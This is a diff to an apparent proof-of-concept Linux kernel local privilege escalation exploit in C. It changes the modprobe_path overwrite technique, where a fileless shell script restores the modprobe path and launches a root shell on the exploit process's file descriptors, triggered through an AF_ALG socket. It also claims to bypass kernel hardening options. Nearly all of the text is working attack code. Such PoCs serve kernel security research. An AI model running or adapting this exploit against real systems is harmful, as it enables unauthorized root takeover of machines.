@@ -14,9 +14,7 @@
  * You may also compile the kernel with CONFIG_PAGE_TABLE_CHECK and CONFIG_TRANSPARENT_HUGEPAGE,
  * since this PoC can bypass them combined.
  *
- * Requirements:
- *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
- *  2) Ensure that KERNEL_TEXT_PATTERNS contains the first bytes of _text of your kernel
+ * Ensure that KERNEL_TEXT_PATTERNS contains the first bytes of _text of your kernel.
  */
 
 #define _GNU_SOURCE
@@ -400,7 +398,7 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 }
 
 /* Fileless approach */
-int prepare_privesc_script(char *path, size_t path_size)
+int prepare_privesc_script(char *path, size_t path_size, char *modprobe_path)
 {
 	pid_t pid = getpid();
 	int script_fd = -1;
@@ -426,8 +424,11 @@ int prepare_privesc_script(char *path, size_t path_size)
 		return EXIT_FAILURE;
 	}
 
-	ret = dprintf(script_fd, "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid,
-		      shell_stdin_fd, pid, shell_stdout_fd);
+	ret = dprintf(script_fd,
+		      "#!/bin/sh\n"
+		      "echo \"%s\" > /proc/sys/kernel/modprobe\n"
+		      "/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
+		      modprobe_path, pid, shell_stdin_fd, pid, shell_stdout_fd);
 	if (ret < 0) {
 		perror("[-] dprintf for privesc_script");
 		return EXIT_FAILURE;
@@ -459,7 +460,7 @@ void trigger_modprobe_sock(void)
 	struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "dummy" };
 	int alg_fd = -1;
 
-	printf("[!] gonna trigger modprobe using AF_ALG socket and launch the root shell\n");
+	printf("[!] triggering modprobe using AF_ALG socket to launch the root shell...\n");
 	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
 	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
 	printf("[!] root shell is finished\n");
@@ -474,12 +475,13 @@ int main(void)
 {
 	int result = EXIT_FAILURE;
 	int ret = EXIT_FAILURE;
+	char modprobe_path[KMOD_PATH_LEN] = { 0 };
+	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
 	int act_fd = -1;
 	long i = 0;
 	long current_n = 0;
 	long reserved_from_n = 0;
 	long uaf_n = 0;
-	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
 	unsigned long phys_addr = 0;
 	struct sysinfo info = { 0 };
 	int huge_pages_n = 0;
@@ -498,7 +500,12 @@ int main(void)
 	if (ret == EXIT_FAILURE)
 		goto end;
 
-	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path));
+	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
+	if (ret == EXIT_FAILURE)
+		goto end;
+
+	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path),
+				     modprobe_path);
 	if (ret == EXIT_FAILURE)
 		goto end;
 
